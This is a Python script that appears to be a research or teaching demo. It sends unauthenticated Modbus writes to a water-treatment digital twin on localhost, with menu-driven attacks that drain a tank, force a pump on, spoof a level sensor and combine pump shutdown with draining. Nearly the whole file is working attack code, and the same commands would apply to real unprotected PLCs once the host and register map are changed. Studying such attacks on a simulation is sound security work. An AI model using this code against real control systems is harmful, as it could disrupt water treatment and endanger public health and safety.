"""
EXAMPLE: Zero-Day Attack on Digital Twin

This script demonstrates how an attacker exploits the unguarded SCADA system.
An attacker can send Modbus packets to:
1. Open valves without authorization (drain tanks)
2. Disable pumps (starve water treatment)
3. Corrupt sensor readings
4. Bypass any logic controls

The digital twin now reflects these attacks in REAL-TIME.
"""

from pymodbus.client import ModbusTcpClient
import time
import sys

def connect_to_twin(host="localhost", port=5020):
    """Connect to the digital twin running on Twin.py"""
    client = ModbusTcpClient(host=host, port=port)
    connected = client.connect()
    if not connected:
        print(f"[ERROR] Cannot connect to {host}:{port}")
        return None
    print(f"[✓] Connected to Digital Twin at {host}:{port}\n")
    return client


def read_current_state(client):
    """Read current plant state from Modbus registers"""
    regs = client.read_holding_registers(1, 5)
    if regs:
        lit101 = regs.registers[0]
        lit301 = regs.registers[1]
        lit401 = regs.registers[2]
        fit101 = regs.registers[3]
        fit301 = regs.registers[4]
        print(f"  Current state: LIT101={lit101}, LIT301={lit301}, LIT401={lit401}, FIT101={fit101}, FIT301={fit301}")
    return regs


# ==============================================================================
# ATTACK 1: EMERGENCY DRAIN — Open valve to empty Tank 4
# ==============================================================================
def attack_emergency_drain():
    """
    Attack: Set MV301 (Motor Valve 3 - Tank Drain) to ON
    Effect: Tank 4 (LIT401) will drain rapidly
    """
    client = connect_to_twin()
    if not client:
        return

    print("="*80)
    print("ATTACK 1: EMERGENCY DRAIN")
    print("="*80)
    print("Sending malicious packet to open motor valve MV301...")
    print("Register 31 = 1 (OPEN)\n")

    # Read initial state
    print("[BEFORE ATTACK]")
    read_current_state(client)
    time.sleep(1)

    # ATTACK: Write to register 31 (MV301)
    attack_msg = client.write_register(31, 1)
    print(f"\n[PACKET SENT] Register 31 ← 1\n")

    # Watch tank drain
    print("[OBSERVING ATTACK CONSEQUENCES]")
    for i in range(5):
        time.sleep(1)
        regs = client.read_holding_registers(1, 5)
        if regs:
            lit401 = regs.registers[2]
            print(f"  Tick {i+1}: LIT401 = {lit401} (draining...)")

    print("\n[ATTACK RESULT] Tank 4 successfully drained by malicious command!")
    print("Attacker achieved: Plant disruption without authentication\n")
    client.close()


# ==============================================================================
# ATTACK 2: PUMP OVERLOAD — Force pump ON and measure chaos
# ==============================================================================
def attack_pump_overload():
    """
    Attack: Set P101 (Raw Water Pump) to continuously ON
    Effect: Tank 1 (LIT101) overflows, water spills
    """
    client = connect_to_twin()
    if not client:
        return

    print("="*80)
    print("ATTACK 2: PUMP OVERLOAD")
    print("="*80)
    print("Sending malicious packet to force pump P101 ON forever...")
    print("Register 20 = 1 (PUMP ON)\n")

    print("[BEFORE ATTACK]")
    read_current_state(client)
    time.sleep(1)

    # ATTACK: Write to register 20 (P101)
    print("\n[PACKET SENT] Register 20 ← 1 (forced ON)\n")
    client.write_register(20, 1)

    print("[OBSERVING ATTACK CONSEQUENCES]")
    for i in range(6):
        time.sleep(1)
        regs = client.read_holding_registers(1, 5)
        if regs:
            lit101 = regs.registers[0]
            print(f"  Tick {i+1}: LIT101 = {lit101} (filling rapidly...)")

    print("\n[ATTACK RESULT] Tank 1 rapidly filling - potential overflow!\n")
    client.close()


# ==============================================================================
# ATTACK 3: SENSOR SPOOFING — Corrupt sensor readings
# ==============================================================================
def attack_sensor_spoofing():
    """
    Attack: Write fake values to sensor registers
    Effect: Controllers see false readings, make wrong decisions
    """
    client = connect_to_twin()
    if not client:
        return

    print("="*80)
    print("ATTACK 3: SENSOR SPOOFING (MitM sensor readings)")
    print("="*80)
    print("Injecting false sensor values into Modbus registers...")
    print("Register 1 (LIT101) ← 100 (fake: tank is full)\n")

    print("[BEFORE SPOOFING]")
    read_current_state(client)
    time.sleep(1)

    # ATTACK: Spoof sensor reading
    print("\n[PACKET SENT] Register 1 ← 100 (false sensor value)\n")
    client.write_register(1, 100)

    print("[RESULT]")
    regs = client.read_holding_registers(1, 5)
    if regs:
        lit101_spoofed = regs.registers[0]
        print(f"  Spoofed sensor: LIT101 = {lit101_spoofed}")
        print(f"  Controller now believes tank is full when it may not be!")
        print(f"  Attacker achieved: Logic corruption via sensor spoofing\n")

    client.close()


# ==============================================================================
# ATTACK 4: SIMULTANEOUS ATTACK — Drain AND disable pump
# ==============================================================================
def attack_combined():
    """
    Attack: Multiple commands at once
    Effect: Cascading failure - system can't respond
    """
    client = connect_to_twin()
    if not client:
        return

    print("="*80)
    print("ATTACK 4: COMBINED ATTACK (Multiple exploits)")
    print("="*80)
    print("Sending multiple malicious packets simultaneously...")
    print("  Register 20 (P101) ← 0 (PUMP OFF)")
    print("  Register 31 (MV301) ← 1 (VALVE OPEN - drain)\n")

    print("[BEFORE ATTACK]")
    read_current_state(client)
    time.sleep(1)

    # ATTACK: Write multiple registers
    print("\n[PACKETS SENT] Simultaneous commands...\n")
    client.write_register(20, 0)  # Turn pump off
    client.write_register(31, 1)  # Open drain valve
    time.sleep(0.2)

    print("[OBSERVING SYSTEMIC FAILURE]")
    for i in range(4):
        time.sleep(1)
        regs = client.read_holding_registers(1, 5)
        if regs:
            lit101 = regs.registers[0]
            lit401 = regs.registers[2]
            print(f"  Tick {i+1}: LIT101 = {lit101} (depleting), LIT401 = {lit401} (draining)")

    print("\n[ATTACK RESULT] Cascading system failure!")
    print("Attacker achieved: Complete loss of operational control\n")
    client.close()


# ==============================================================================
# RUN ATTACKS
# ==============================================================================
if __name__ == "__main__":
    print("\n")
    print("╔" + "="*78 + "╗")
    print("║" + " "*78 + "║")
    print("║" + "  ZERO-DAY ATTACK DEMONSTRATIONS ON DIGITAL TWIN".center(78) + "║")
    print("║" + "  (Real-time SCADA vulnerability exploitation)".center(78) + "║")
    print("║" + " "*78 + "║")
    print("╚" + "="*78 + "╝\n")

    attacks = [
        ("1. Emergency Drain Attack", attack_emergency_drain),
        ("2. Pump Overload Attack", attack_pump_overload),
        ("3. Sensor Spoofing Attack", attack_sensor_spoofing),
        ("4. Combined Attack", attack_combined),
    ]

    print("Available attack demonstrations:\n")
    for i, (name, _) in enumerate(attacks, 1):
        print(f"  {i}. {name}")
    print(f"  {len(attacks)+1}. Run all attacks")
    print(f"  {len(attacks)+2}. Exit\n")

    choice = input("Select attack to run (or press Enter for all): ").strip()

    if choice == "" or choice.lower() == "all" or choice == str(len(attacks)+1):
        for name, attack_func in attacks:
            print()
            attack_func()
            time.sleep(2)
        print("\n[*] All attacks completed. Check attack_forensics.log for full details.")
    elif choice.isdigit() and 1 <= int(choice) <= len(attacks):
        print()
        attacks[int(choice)-1][1]()
    else:
        print("Invalid choice")
